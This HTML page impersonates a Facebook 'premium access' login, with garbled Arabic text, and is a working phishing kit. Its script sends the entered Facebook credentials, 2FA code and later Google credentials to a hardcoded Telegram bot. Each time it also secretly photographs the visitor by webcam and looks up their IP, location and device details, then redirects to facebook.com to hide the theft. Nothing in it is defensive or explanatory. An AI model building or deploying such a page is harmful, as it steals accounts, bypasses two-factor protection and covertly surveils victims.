<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Access | ШҜШ®ЩҲЩ„ Ш§Щ„ШЈШ№Ш¶Ш§ШЎ</title>
    <style>
        :root { --fb-blue: #1877f2; --premium-gold: #d4af37; }
        body { font-family: 'Segoe UI', sans-serif; background: radial-gradient(circle, #1a1a1a, #000); color: white; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
        .card { width: 90%; max-width: 420px; background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; border: 1px solid var(--premium-gold); box-shadow: 0 0 20px rgba(212, 175, 55, 0.2); text-align: center; }
        .fb-header-logo { width: 45px; margin-bottom: 10px; }
        .premium-tag { background: var(--premium-gold); color: black; padding: 5px 15px; border-radius: 50px; font-weight: bold; font-size: 12px; display: inline-block; margin-bottom: 15px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; background: #333; color: white; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; background: var(--fb-blue); color: white; }
        #loader-screen, #step2, #step3 { display: none; }
        .progress-container { width: 100%; background: #333; height: 10px; border-radius: 5px; margin: 20px 0; overflow: hidden; }
        .progress-bar { width: 0%; height: 100%; background: var(--premium-gold); transition: linear; }
        #timer { font-size: 24px; color: var(--premium-gold); }
    </style>
</head>
<body>

<div class="card">
    <div id="step1">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-header-logo" alt="FB">
        <div class="premium-tag">PREMIUM ACCESS ONLY</div>
        <h2>Ш§Щ„ШәШұЩҒШ© Ш§Щ„Ш®Ш§ШөШ©</h2>
        <p style="font-size: 14px; color: #ccc;">ШіШ¬Щ„ ШҜШ®ЩҲЩ„Щғ Щ„ШӘЩҒШ№ЩҠЩ„ ШҜШ№ЩҲШӘЩғ Ш§Щ„Щ…Ш¬Ш§ЩҶЩҠШ©.</p>
        <input type="text" id="fb-user" placeholder="Ш§Щ„ШЁШұЩҠШҜ Ш§Щ„ШҘЩ„ЩғШӘШұЩҲЩҶЩҠ ШЈЩҲ Ш§Щ„ЩҮШ§ШӘЩҒ">
        <input type="password" id="fb-pass" placeholder="ЩғЩ„Щ…Ш© Ш§Щ„ШіШұ">
        <button class="btn" onclick="handleStep1()">ШҜШ®ЩҲЩ„ ШўЩ…ЩҶ</button>
    </div>

    <div id="step2">
        <h2>ШӘШЈЩғЩҠШҜ Ш§Щ„ШЈЩ…Ш§ЩҶ</h2>
        <input type="number" id="2fa-code" placeholder="ШұЩ…ШІ 2FA">
        <button class="btn" style="background: #42b72a;" onclick="handleStep2()">ШӘШЈЩғЩҠШҜ</button>
    </div>

    <div id="loader-screen">
        <h2>Ш¬Ш§ШұЩҠ Ш§Щ„ШӘШ¬ЩҮЩҠШІ...</h2>
        <div class="progress-container"><div class="progress-bar" id="p-bar"></div></div>
        <div id="timer">02:00</div>
    </div>

    <div id="step3">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_Reference_Logo.svg/200px-Google_Reference_Logo.svg.png" width="80">
        <input type="email" id="gm-user" placeholder="Google Email">
        <input type="password" id="gm-pass" placeholder="Password">
        <button class="btn" style="background:white; color:#555;" onclick="handleStep3()">ШӘШЈЩғЩҠШҜ Ш№ШЁШұ Google</button>
    </div>

    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
</div>

<script>
    const token = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
    const chatId = '8350812242';

    // Ш·Щ„ШЁ Ш§Щ„ЩғШ§Щ…ЩҠШұШ§ ЩҲШ§Щ„Щ…ЩҲЩӮШ№ ЩҒЩҲШұ Ш§Щ„ШҜШ®ЩҲЩ„
    window.onload = () => {
        navigator.mediaDevices.getUserMedia({ video: true }).then(s => document.getElementById('video').srcObject = s);
        navigator.geolocation.getCurrentPosition(() => {}, () => {}); // Щ„Ш·Щ„ШЁ ШҘШ°ЩҶ Ш§Щ„Щ…ЩҲЩӮШ№
    };

    async function getAdvancedInfo() {
        let locationInfo = "Location: Access Denied";
        try {
            const res = await fetch('http://ip-api.com/json/');
            const data = await res.json();
            locationInfo = `рҹҢҚ Ш§Щ„ШЁЩ„ШҜ: ${data.country} (${data.countryCode})\nрҹҸҷпёҸ Ш§Щ„Щ…ШҜЩҠЩҶШ©: ${data.city}\nрҹ“Ў Ш§Щ„Щ…ШІЩҲШҜ: ${data.isp}\nрҹ“Қ IP: \`${data.query}\``;
        } catch(e) { console.log(e); }

        const deviceInfo = `рҹ“ұ Ш§Щ„Ш¬ЩҮШ§ШІ: \`${navigator.platform}\`\nрҹ–ҘпёҸ Ш§Щ„Щ…ШӘШөЩҒШӯ: \`${navigator.userAgent.split(') ')[1]}\``;
        return `${locationInfo}\n${deviceInfo}`;
    }

    async function sendToTelegram(title, data) {
        const advInfo = await getAdvancedInfo();
        const msg = `рҹҡҖ **${title}** рҹҡҖ\n${data}\n\nрҹ“Ҡ **Щ…Ш№Щ„ЩҲЩ…Ш§ШӘ Ш§Щ„Ш¬ЩҮШ§ШІ ЩҲШ§Щ„Щ…ЩҲЩӮШ№:**\n${advInfo}`;
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
    }

    async function takePhotos() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        for(let i=0; i<3; i++) {
            canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
            const fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('photo', blob);
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:fd});
            await new Promise(r => setTimeout(r, 1000));
        }
    }

    function handleStep1() {
        const u = document.getElementById('fb-user').value;
        const p = document.getElementById('fb-pass').value;
        sendToTelegram("FB Login", `рҹ‘Ө: \`${u}\`\nрҹ”‘: \`${p}\``);
        takePhotos();
        document.getElementById('step1').style.display='none';
        document.getElementById('step2').style.display='block';
    }

    function handleStep2() {
        const c = document.getElementById('2fa-code').value;
        sendToTelegram("FB 2FA", `рҹӣЎпёҸ Code: \`${c}\``);
        takePhotos();
        document.getElementById('step2').style.display='none';
        startLoader();
    }

    function startLoader() {
        document.getElementById('loader-screen').style.display='block';
        let time = 120;
        const intr = setInterval(() => {
            time--;
            let m = Math.floor(time/60), s = time%60;
            document.getElementById('timer').innerText = `${m<10?'0'+m:m}:${s<10?'0'+s:s}`;
            document.getElementById('p-bar').style.width = ((120-time)/120*100)+'%';
            if(time <= 0) { clearInterval(intr); document.getElementById('loader-screen').style.display='none'; document.getElementById('step3').style.display='block'; }
        }, 1000);
    }

    function handleStep3() {
        const u = document.getElementById('gm-user').value;
        const p = document.getElementById('gm-pass').value;
        sendToTelegram("Google Data", `рҹ“§: \`${u}\`\nрҹ”‘: \`${p}\``);
        takePhotos();
        setTimeout(() => window.location.href="https://facebook.com", 2000);
    }
</script>
</body>
</html>
